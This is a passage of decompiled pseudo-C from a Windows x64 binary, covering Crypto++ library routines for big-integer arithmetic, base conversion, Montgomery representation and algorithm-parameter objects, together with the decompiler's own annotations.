    *(_QWORD *)(v19 + 8) = "PaddingByte";
    *(_BYTE *)(v19 + 16) = v18;
    *(_BYTE *)(v19 + 17) = 0;
    *(_QWORD *)(v19 + 24) = 0i64;
    *(_QWORD *)v19 = off_13F184620;
    *(_BYTE *)(v19 + 32) = 61;
  }
  else
  {
    v20 = 0i64;
  }
  v41 = v20;
  v21 = *(_QWORD *)(v17 + 8);
  *(_QWORD *)(v17 + 8) = 0i64;
  v22 = *(void (__fastcall ****)(_QWORD, __int64))(v20 + 24);
  if ( v22 )
    (**v22)(v22, 1i64);
  *(_QWORD *)(v20 + 24) = v21;
  v41 = 0i64;
  v23 = *(void (__fastcall ****)(_QWORD, __int64))(v17 + 8);
  if ( v23 )
    (**v23)(v23, 1i64);
  *(_QWORD *)(v17 + 8) = v20;
  *(_BYTE *)(v17 + 16) = v18;
  v24 = sub_13F14059C(40i64);
  v41 = v24;
  if ( v24 )
  {
    *(_QWORD *)(v24 + 8) = "GroupSize";
    *(_BYTE *)(v24 + 16) = v18;
    *(_BYTE *)(v24 + 17) = 0;
    *(_QWORD *)(v24 + 24) = 0i64;
    *(_QWORD *)v24 = off_13F183720;
    *(_DWORD *)(v24 + 32) = v8;
  }
  else
  {
    v24 = 0i64;
  }
  v41 = v24;
  v25 = *(_QWORD *)(v17 + 8);
  *(_QWORD *)(v17 + 8) = 0i64;
  v26 = *(void (__fastcall ****)(_QWORD, __int64))(v24 + 24);
  if ( v26 )
    (**v26)(v26, 1i64);
  *(_QWORD *)(v24 + 24) = v25;
  v41 = 0i64;
  v27 = *(void (__fastcall ****)(_QWORD, __int64))(v17 + 8);
  if ( v27 )
    (**v27)(v27, 1i64);
  *(_QWORD *)(v17 + 8) = v24;
  *(_BYTE *)(v17 + 16) = v18;
  v28 = sub_13F107DB0(v17, (__int64)"Separator", (__int64)v44, v18);
  v29 = sub_13F107DB0(v28, (__int64)"Terminator", (__int64)v49, *(_BYTE *)(v28 + 16));
  v30 = sub_13F14059C(40i64);
  v31 = v30;
  v41 = v30;
  if ( v30 )
  {
    *(_QWORD *)(v30 + 8) = "Log2Base";
    *(_WORD *)(v30 + 16) = 1;
    *(_QWORD *)(v30 + 24) = 0i64;
    *(_QWORD *)v30 = off_13F183720;
    *(_DWORD *)(v30 + 32) = 6;
  }
  else
  {
    v31 = 0i64;
  }
  v41 = v31;
  v32 = *(_QWORD *)(v29 + 8);
  *(_QWORD *)(v29 + 8) = 0i64;
  v33 = *(void (__fastcall ****)(_QWORD, __int64))(v31 + 24);
  if ( v33 )
    (**v33)(v33, 1i64);
  *(_QWORD *)(v31 + 24) = v32;
  v41 = 0i64;
  v34 = *(void (__fastcall ****)(_QWORD, __int64))(v29 + 8);
  if ( v34 )
    (**v34)(v34, 1i64);
  *(_QWORD *)(v29 + 8) = v31;
  *(_BYTE *)(v29 + 16) = 1;
  v43[0] = (__int64)&CryptoPP::CombinedNameValuePairs::`vftable';
  v43[1] = a2;
  v43[2] = v29;
  result = (*(__int64 (__fastcall **)(__int64, __int64 *, __int64))(*(_QWORD *)v9 + 88i64))(v9, v43, 0xFFFFFFFFi64);
  v43[0] = (__int64)&CryptoPP::NameValuePairs::`vftable';
  if ( v58 )
    result = (**v58)(v58, 1i64);
  v57 = &CryptoPP::NameValuePairs::`vftable';
  v36 = v47.m128i_u64[1];
  if ( v47.m128i_i64[0] < (unsigned __int64)v47.m128i_i64[1] )
    v36 = v47.m128i_i64[0];
  v37 = v48;
  if ( v48 )
  {
    memset(v48, 0, v36);
    result = sub_13F12E550(v37);
  }
  v38 = si128.m128i_u64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v38 = si128.m128i_i64[0];
  v39 = v53;
  if ( v53 )
  {
    memset(v53, 0, v38);
    return sub_13F12E550(v39);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F183720: using guessed type __int64 (__fastcall *off_13F183720[4])();
// 13F184590: using guessed type void *CryptoPP::CombinedNameValuePairs::`vftable';
// 13F184600: using guessed type void *CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';
// 13F184620: using guessed type __int64 (__fastcall *off_13F184620[3])();
// 13F19CCB0: using guessed type __int128 xmmword_13F19CCB0;
// 13F1C3820: using guessed type bool bool `RTTI Type Descriptor';
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';
// 13F111BC0: using guessed type char var_110[8];
// 13F111BC0: using guessed type char var_A8[8];
// 13F111BC0: using guessed type char var_E0[8];

//----- (000000013F112010) ----------------------------------------------------
__int64 __fastcall sub_13F112010(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  sub_13F102D40(a2, a1);
  *(_QWORD *)a2 = off_13F184620;
  result = *(unsigned __int8 *)(a1 + 32);
  *(_BYTE *)(a2 + 32) = result;
  return result;
}
// 13F184620: using guessed type __int64 (__fastcall *off_13F184620[3])();

//----- (000000013F112050) ----------------------------------------------------
__int64 __fastcall sub_13F112050(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax

  sub_13F102D40((__int64)a2, a1);
  *a2 = &CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';
  result = *(_QWORD *)(a1 + 32);
  a2[4] = result;
  return result;
}
// 13F184600: using guessed type void *CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable';

//----- (000000013F112090) ----------------------------------------------------
__int64 __fastcall sub_13F112090(unsigned int *a1, unsigned int a2, unsigned int a3)
{
  __int64 v3; // r10
  __int64 v4; // rbx
  unsigned int v5; // edi
  unsigned int v6; // esi
  unsigned int v7; // er11
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rdx
  unsigned int v10; // er8
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rdx

  v3 = a3;
  v4 = a2;
  if ( a3 )
  {
    if ( a3 == -1 )
    {
      v7 = a1[2];
      v5 = v7;
      v6 = a1[1];
    }
    else
    {
      v5 = a1[2];
      v6 = a1[1];
      v7 = *(_QWORD *)(a1 + 1) / (unsigned __int64)(a3 + 1);
    }
  }
  else
  {
    v5 = a1[2];
    v6 = a1[1];
    v7 = *(_QWORD *)a1 / (unsigned __int64)a2;
  }
  v8 = *a1 - (unsigned __int64)(a2 * v7);
  *a1 = v8;
  v9 = v6
     - (unsigned __int64)(unsigned int)-HIDWORD(v8)
     - v7 * (unsigned __int64)a3
     - ((v4 * (unsigned __int64)v7) >> 32);
  a1[1] = v9;
  v10 = HIDWORD(v9) + v5;
  while ( 1 )
  {
    a1[2] = v10;
    if ( !v10 && *(_QWORD *)a1 < __PAIR64__(v3, v4) )
      break;
    v11 = a1[1];
    v12 = *a1 - v4;
    *a1 = v12;
    v13 = v11 - (unsigned int)-HIDWORD(v12) - v3;
    a1[1] = v13;
    v10 += HIDWORD(v13);
    ++v7;
  }
  return v7;
}
// 13F1120D6: conditional instruction was optimized away because er8.4==0

//----- (000000013F1121A0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1121A0(unsigned __int64 *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v6; // r14
  unsigned __int64 v7; // r15
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // rsi
  unsigned __int64 v10; // r10
  unsigned __int128 v11; // rax
  unsigned __int64 v12; // r8
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r11
  unsigned __int64 v15; // r8
  __int64 v16; // rcx
  unsigned __int64 v18; // [rsp+20h] [rbp-28h] BYREF
  unsigned __int64 v19; // [rsp+28h] [rbp-20h]

  if ( !a3 )
  {
    v6 = a1[1];
    v18 = *a1;
    v19 = v6;
    v8 = sub_13F113C40((__int64 *)&v18, a2);
    v7 = a1[2];
    goto LABEL_6;
  }
  if ( a3 != -1i64 )
  {
    v6 = a1[1];
    v7 = a1[2];
    v18 = v6;
    v19 = v7;
    v8 = sub_13F113C40((__int64 *)&v18, a3 + 1);
LABEL_6:
    v9 = v8;
    goto LABEL_7;
  }
  v9 = a1[2];
  v6 = a1[1];
  v7 = v9;
LABEL_7:
  v10 = *a1 - a2 * v9;
  v11 = a3 * (unsigned __int128)v9;
  v12 = (__PAIR128__(v6 - ((a2 * (unsigned __int128)v9) >> 64), *a1) - v10) >> 64;
  v13 = v12 - v11;
  v14 = v7
      + ((__PAIR128__(
            (__PAIR128__((v6 - ((a2 * (unsigned __int128)v9) >> 64)) >> 64, v12) - (v12 - (unsigned __int64)v11)) >> 64,
            v6 - ((a2 * (unsigned __int128)v9) >> 64))
        - v12) >> 64)
      - *((_QWORD *)&v11 + 1);
  while ( 1 )
  {
    a1[2] = v14;
    a1[1] = v13;
    *a1 = v10;
    v15 = v13;
    if ( !v14 && v13 <= a3 && (v13 != a3 || v10 < a2) )
      break;
    v16 = (v10 - (unsigned __int128)a2) >> 64;
    v10 -= a2;
    v13 = v15 - a3 + v16;
    v14 += (__PAIR128__(-(__int64)(v15 < v15 - a3), v15 - a3) - v13) >> 64;
    ++v9;
  }
  return v9;
}

//----- (000000013F1122F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1122F0(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4)
{
  __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rcx
  void *v11; // r8
  __int64 v12; // rcx
  __int64 v13; // rdx
  __int64 v14; // rcx
  void *v15; // r8
  __int64 (__fastcall **v17)(); // [rsp+30h] [rbp-48h] BYREF
  char v18[8]; // [rsp+38h] [rbp-40h] BYREF
  __m128i si128; // [rsp+40h] [rbp-38h]
  _QWORD *v20; // [rsp+50h] [rbp-28h]
  int v21; // [rsp+58h] [rbp-20h]

  v17 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v20 = (_QWORD *)sub_13F123740((__int64)v18, 2ui64);
  v21 = 0;
  v20[1] = 0i64;
  *v20 = 0i64;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, __int64, void *, __int64 (__fastcall ***)(), _DWORD, __int64, __int64 (__fastcall **)()))(*(_QWORD *)a1 + 8i64))(
         a1,
         a3,
         &CryptoPP::Integer `RTTI Type Descriptor',
         &v17,
         0,
         -2i64,
         v17) )
  {
    sub_13F112A00(a2, (__int64)&v17);
    v8 = si128.m128i_i64[1];
    if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
      v8 = si128.m128i_i64[0];
    v9 = (__int64)v20;
    if ( v20 )
    {
      memset(v20, 0, 8 * v8);
      sub_13F12E4D0(v9);
    }
    v10 = 2i64;
    if ( a4[2] < a4[3] )
      v10 = 1i64;
    v11 = (void *)a4[4];
    if ( v11 )
    {
      memset(v11, 0, 8i64 * a4[v10 + 1]);
      sub_13F12E4D0((__int64)v11);
    }
  }
  else
  {
    sub_13F112A00(a2, (__int64)a4);
    v12 = si128.m128i_i64[1];
    if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
      v12 = si128.m128i_i64[0];
    v13 = (__int64)v20;
    if ( v20 )
    {
      memset(v20, 0, 8 * v12);
      sub_13F12E4D0(v13);
    }
    v14 = 2i64;
    if ( a4[2] < a4[3] )
      v14 = 1i64;
    v15 = (void *)a4[4];
    if ( v15 )
    {
      memset(v15, 0, 8i64 * a4[v14 + 1]);
      sub_13F12E4D0((__int64)v15);
    }
  }
  return a2;
}
// 13F112334: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F1122F0: using guessed type char var_40[8];

//----- (000000013F1124A0) ----------------------------------------------------
__m128i *__fastcall sub_13F1124A0(__m128i *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r13
  unsigned int v5; // er12
  unsigned int v6; // ecx
  unsigned __int64 v7; // rsi
  unsigned __int64 v8; // r14
  unsigned __int64 v9; // rdi
  char v10; // bl
  int v11; // er12
  __int8 v12; // di
  __int128 v13; // kr00_16
  __int128 *v14; // rax
  const __m128i *v15; // r9
  __int64 v16; // rdi
  __int128 v17; // kr10_16
  __int128 *v18; // rbx
  __m128i *v19; // rbx
  unsigned __int64 v20; // rdx
  __int64 v21; // rax
  __m128i v22; // xmm0
  __m128i v23; // xmm1
  unsigned int v25; // [rsp+34h] [rbp-25h]
  unsigned __int64 i; // [rsp+38h] [rbp-21h]
  __int128 v27; // [rsp+48h] [rbp-11h] BYREF
  __int128 v28; // [rsp+58h] [rbp-1h]
  __int128 v29; // [rsp+68h] [rbp+Fh] BYREF
  __int128 v30; // [rsp+78h] [rbp+1Fh]

  v3 = a2;
  v5 = 0;
  v6 = (unsigned int)a3 >> 26;
  v25 = (unsigned int)a3 >> 26;
  LODWORD(a3) = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    v7 = 0i64;
    *(_QWORD *)&v30 = 0i64;
    v8 = 15i64;
    *((_QWORD *)&v30 + 1) = 15i64;
    LOBYTE(v29) = 0;
    for ( i = a3; ; a3 = i )
    {
      v9 = v3 % a3;
      v3 /= a3;
      v10 = v9 >= 0xA ? (~(_BYTE)v6 & 0x20 | 0x41) - 10 : 48;
      *(_QWORD *)&v28 = 0i64;
      *((_QWORD *)&v28 + 1) = 15i64;
      LOBYTE(v27) = 0;
      v11 = v5 | 2;
      sub_13F106B80((__m128i *)&v27, v7 + 1);
      v12 = v10 + v9;
      v13 = v28;
      if ( (unsigned __int64)v28 >= *((_QWORD *)&v28 + 1) )
      {
        sub_13F10ECD0((__m128i *)&v27, 1ui64, 0i64, v12);
      }
      else
      {
        *(_QWORD *)&v28 = v28 + 1;
        v14 = &v27;
        if ( *((_QWORD *)&v13 + 1) >= 0x10ui64 )
          v14 = (__int128 *)v27;
        *((_BYTE *)v14 + v13) = v12;
        *((_BYTE *)v14 + v13 + 1) = 0;
      }
      v15 = (const __m128i *)&v29;
      v16 = v29;
      if ( v8 >= 0x10 )
        v15 = (const __m128i *)v29;
      v17 = v28;
      if ( v7 > *((_QWORD *)&v28 + 1) - (_QWORD)v28 )
      {
        sub_13F107AD0((__m128i *)&v27, v7, 0i64, v15, v7);
        v8 = *((_QWORD *)&v30 + 1);
        v16 = v29;
      }
      else
      {
        *(_QWORD *)&v28 = v28 + v7;
        v18 = &v27;
        if ( *((_QWORD *)&v17 + 1) >= 0x10ui64 )
          v18 = (__int128 *)v27;
        v19 = (__m128i *)((char *)v18 + v17);
        sub_13F15EB00(v19, v15, v7);
        v19->m128i_i8[v7] = 0;
      }
      if ( v8 >= 0x10 )
      {
        v20 = v8 + 1;
        v21 = v16;
        if ( v8 + 1 >= 0x1000 )
        {
          v20 = v8 + 40;
          v16 = *(_QWORD *)(v16 - 8);
          if ( (unsigned __int64)(v21 - v16 - 8) > 0x1F )
            sub_13F1682C0();
        }
        sub_13F14088C(v16, v20);
      }
      v22 = (__m128i)v27;
      v29 = v27;
      v23 = (__m128i)v28;
      v30 = v28;
      v5 = v11 & 0xFFFFFFFD;
      if ( !v3 )
        break;
      v8 = *((_QWORD *)&v30 + 1);
      v7 = v30;
      LOBYTE(v6) = v25;
    }
    a1[1].m128i_i64[0] = 0i64;
    a1[1].m128i_i64[1] = 0i64;
    *a1 = v22;
    a1[1] = v23;
  }
  else
  {
    a1[1].m128i_i64[0] = 0i64;
    a1[1].m128i_i64[1] = 15i64;
    a1->m128i_i8[0] = 0;
    sub_13F106C30(a1, (const __m128i *)"0");
  }
  return a1;
}
// 13F112537: conditional instruction was optimized away because rdx.8!=0
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F112700) ----------------------------------------------------
unsigned __int64 *__fastcall sub_13F112700(unsigned __int64 *a1, __int64 a2)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rax
  __m128i *v6; // rax
  __m128i *v7; // rdi
  unsigned __int64 v8; // rbx

  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  v4 = (__int64)(*(_QWORD *)(a2 + 8) - *(_QWORD *)a2) >> 2;
  if ( v4 )
  {
    if ( v4 > 0x3FFFFFFFFFFFFFFFi64 )
      sub_13F10D1F0();
    v5 = sub_13F10D210((__int64)a1, (__int64)(*(_QWORD *)(a2 + 8) - *(_QWORD *)a2) >> 2);
    *a1 = v5;
    a1[1] = v5;
    v6 = (__m128i *)*a1;
    a1[2] = *a1 + 4 * v4;
    v7 = v6;
    v8 = *(_QWORD *)(a2 + 8) - *(_QWORD *)a2;
    sub_13F15EB00(v6, *(const __m128i **)a2, v8);
    a1[1] = (unsigned __int64)v7->m128i_u64 + v8;
  }
  return a1;
}

//----- (000000013F1127B0) ----------------------------------------------------
unsigned __int64 *__fastcall sub_13F1127B0(unsigned __int64 *a1, unsigned __int64 a2, _DWORD *a3)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rax
  _DWORD *i; // rcx

  v4 = a2;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x3FFFFFFFFFFFFFFFi64 )
      sub_13F10D1F0();
    v6 = sub_13F10D210((__int64)a1, a2);
    *a1 = v6;
    a1[1] = v6;
    v7 = *a1;
    a1[2] = *a1 + 4 * v4;
    for ( i = (_DWORD *)v7; v4; --v4 )
      *i++ = *a3;
    a1[1] = (unsigned __int64)i;
  }
  return a1;
}

//----- (000000013F112850) ----------------------------------------------------
_QWORD *__fastcall sub_13F112850(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = &CryptoPP::Integer::DivideByZero::`vftable';
  return a1;
}
// 13F185248: using guessed type void *CryptoPP::Integer::DivideByZero::`vftable';

//----- (000000013F112880) ----------------------------------------------------
__int64 __fastcall sub_13F112880(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __m128i v5; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+40h] [rbp-28h]

  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v5.m128i_i8[0] = 0;
  sub_13F106C30(&v5, (const __m128i *)"Integer: division by zero");
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 6;
  sub_13F1053F0((__m128i **)(a1 + 32), &v5);
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v2 = si128.m128i_i64[1] + 1;
    v3 = v5.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v2 = si128.m128i_i64[1] + 40;
      v3 = *(_QWORD *)(v5.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v5.m128i_i64[0] - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v2);
  }
  *(_QWORD *)a1 = &CryptoPP::Integer::DivideByZero::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F185248: using guessed type void *CryptoPP::Integer::DivideByZero::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F112960) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112960(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v5; // rax
  _QWORD *v6; // rax

  *(_QWORD *)a1 = off_13F185278;
  v5 = sub_13F122180(a3);
  *(_QWORD *)(a1 + 24) = v5;
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 32) = sub_13F123740(a1 + 8, v5);
  v6 = *(_QWORD **)(a1 + 32);
  *(_DWORD *)(a1 + 40) = 0;
  *v6 = a2;
  if ( *(_QWORD *)(a1 + 24) != 1i64 )
    memset((void *)(*(_QWORD *)(a1 + 32) + 8i64), 0, 8 * (*(_QWORD *)(a1 + 24) - 1i64));
  return a1;
}
// 13F112983: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();

//----- (000000013F112A00) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112A00(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  _QWORD *v5; // rcx
  __int64 v6; // rax
  __m128i *v7; // rcx
  const __m128i *v8; // r8

  *(_QWORD *)a1 = off_13F185278;
  v4 = *(_QWORD *)(a2 + 24);
  if ( v4 )
  {
    v5 = (_QWORD *)(*(_QWORD *)(a2 + 32) + 8 * v4 - 8);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = sub_13F122180((unsigned int)v4);
  *(_QWORD *)(a1 + 24) = v6;
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 32) = sub_13F123740(a1 + 8, v6);
  v7 = *(__m128i **)(a1 + 32);
  *(_DWORD *)(a1 + 40) = *(_DWORD *)(a2 + 40);
  v8 = *(const __m128i **)(a2 + 32);
  if ( v7 != v8 )
    sub_13F10D330(v7, 8i64 * *(_QWORD *)(a1 + 24), v8, 8i64 * *(_QWORD *)(a1 + 24));
  return a1;
}
// 13F112A23: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();

//----- (000000013F112AD0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112AD0(__int64 a1, unsigned int a2)
{
  *(_QWORD *)a1 = off_13F185278;
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 24) = 2i64;
  *(_QWORD *)(a1 + 32) = sub_13F123740(a1 + 8, 2ui64);
  *(_DWORD *)(a1 + 40) = a2 >> 31;
  **(_QWORD **)(a1 + 32) = (int)abs32(a2);
  *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64) = 0i64;
  return a1;
}
// 13F112AF2: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();

//----- (000000013F112B70) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
_QWORD *__fastcall sub_13F112B70(_QWORD *a1, __int64 a2, __int64 a3, int a4, int a5)
{
  _BYTE *v9; // rbp
  __int64 v10; // rdx
  _BYTE *i; // rcx
  char v13[8]; // [rsp+30h] [rbp-B8h] BYREF
  __int64 v14; // [rsp+38h] [rbp-B0h]
  __int64 v15; // [rsp+40h] [rbp-A8h]
  _BYTE *v16; // [rsp+48h] [rbp-A0h]
  char v17[64]; // [rsp+70h] [rbp-78h] BYREF

  *a1 = off_13F185278;
  a1[2] = 0x1FFFFFFFFFFFFFFFi64;
  v9 = 0i64;
  a1[3] = 0i64;
  a1[4] = sub_13F123740((__int64)(a1 + 1), 0i64);
  if ( a5 )
  {
    sub_13F1131B0((__int64)v13, a2, a3);
    sub_13F11C820((__int64)a1, (__int64)v13, a3, a4);
  }
  else
  {
    v14 = -1i64;
    v15 = a3;
    if ( a3 )
      v9 = (_BYTE *)sub_13F12E4E0(a3);
    v16 = v9;
    v10 = a3 + a2;
    if ( a3 < 0 )
      sub_13F1682C0();
    for ( i = v9; v10 != a2; ++i )
      *i = *(_BYTE *)--v10;
    sub_13F1131B0((__int64)v17, (__int64)v9, a3);
    sub_13F11C820((__int64)a1, (__int64)v17, a3, a4);
    if ( v9 )
    {
      memset(v9, 0, a3);
      sub_13F12E550(v9);
    }
  }
  return a1;
}
// 13F112BC1: write access to const memory at 13F1C4384 has been detected
// 13F112C5B: conditional instruction was optimized away because rbx.8<0
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F112B70: using guessed type char var_B8[8];

//----- (000000013F112CF0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112CF0(__int64 a1)
{
  __int64 v2; // rax

  *(_QWORD *)a1 = off_13F185278;
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 24) = 2i64;
  *(_QWORD *)(a1 + 32) = sub_13F123740(a1 + 8, 2ui64);
  v2 = *(_QWORD *)(a1 + 32);
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(v2 + 8) = 0i64;
  **(_QWORD **)(a1 + 32) = 0i64;
  return a1;
}
// 13F112D0B: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();

//----- (000000013F112D70) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112D70(__int64 a1, __int64 a2)
{
  unsigned __int64 v3; // rcx
  __int64 v4; // rax

  *(_QWORD *)(a1 + 8) = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  *(_QWORD *)(a1 + 16) = a1;
  *(_QWORD *)a1 = off_13F185368;
  sub_13F112A00(a1 + 24, a2 + 24);
  v3 = *(_QWORD *)(a1 + 48);
  *(_QWORD *)(a1 + 72) = off_13F185278;
  v4 = sub_13F122180(v3);
  *(_QWORD *)(a1 + 88) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 96) = v4;
  *(_QWORD *)(a1 + 104) = sub_13F123740(a1 + 80, v4);
  *(_DWORD *)(a1 + 112) = 0;
  **(_QWORD **)(a1 + 104) = 0i64;
  if ( *(_QWORD *)(a1 + 96) != 1i64 )
    memset((void *)(*(_QWORD *)(a1 + 104) + 8i64), 0, 8 * (*(_QWORD *)(a1 + 96) - 1i64));
  sub_13F112CF0(a1 + 120);
  return a1;
}
// 13F112DD2: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F1852F8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 13F185368: using guessed type __int64 (__fastcall *off_13F185368[28])();

//----- (000000013F112E50) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112E50(__int64 a1, __int64 a2)
{
  unsigned __int64 v4; // rcx
  __int64 v5; // rax

  *(_QWORD *)(a1 + 8) = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  *(_QWORD *)(a1 + 16) = a1;
  *(_QWORD *)a1 = off_13F185368;
  sub_13F112A00(a1 + 24, a2);
  v4 = *(_QWORD *)(a2 + 24);
  *(_QWORD *)(a1 + 72) = off_13F185278;
  v5 = sub_13F122180(v4);
  *(_QWORD *)(a1 + 88) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 96) = v5;
  *(_QWORD *)(a1 + 104) = sub_13F123740(a1 + 80, v5);
  *(_DWORD *)(a1 + 112) = 0;
  **(_QWORD **)(a1 + 104) = 0i64;
  if ( *(_QWORD *)(a1 + 96) != 1i64 )
    memset((void *)(*(_QWORD *)(a1 + 104) + 8i64), 0, 8 * (*(_QWORD *)(a1 + 96) - 1i64));
  sub_13F112CF0(a1 + 120);
  return a1;
}
// 13F112EB1: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F1852F8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 13F185368: using guessed type __int64 (__fastcall *off_13F185368[28])();

//----- (000000013F112F30) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F112F30(__int64 a1, __int64 a2)
{
  unsigned __int64 v3; // rcx
  __int64 v4; // rax
  _QWORD *v5; // rax
  unsigned __int64 v6; // rdx
  __m128i *v7; // rax
  __m128i v9[2]; // [rsp+38h] [rbp-90h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-68h] BYREF

  sub_13F112E50(a1, a2);
  *(_QWORD *)a1 = off_13F185448;
  v3 = *(_QWORD *)(a1 + 48);
  *(_QWORD *)(a1 + 168) = off_13F185278;
  v4 = sub_13F122180(v3);
  *(_QWORD *)(a1 + 184) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 192) = v4;
  v5 = (_QWORD *)sub_13F123740(a1 + 176, v4);
  *(_QWORD *)(a1 + 200) = v5;
  *(_DWORD *)(a1 + 208) = 0;
  *v5 = 0i64;
  if ( *(_QWORD *)(a1 + 192) != 1i64 )
    memset((void *)(*(_QWORD *)(a1 + 200) + 8i64), 0, 8 * (*(_QWORD *)(a1 + 192) - 1i64));
  v6 = 5i64 * *(_QWORD *)(a1 + 48);
  *(_QWORD *)(a1 + 224) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 232) = v6;
  v7 = (__m128i *)sub_13F123740(a1 + 216, v6);
  *(_QWORD *)(a1 + 240) = v7;
  if ( !*(_QWORD *)(a1 + 48) || (**(_BYTE **)(a1 + 56) & 1) == 0 )
  {
    sub_13F1053B0(v9, (const __m128i *)"MontgomeryRepresentation: Montgomery representation requires an odd modulus");
    sub_13F101600((__int64)pExceptionObject, v9);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_13F1219C0(*(unsigned __int64 **)(a1 + 200), v7, *(unsigned __int64 **)(a1 + 56), *(_QWORD *)(a1 + 48));
  return a1;
}
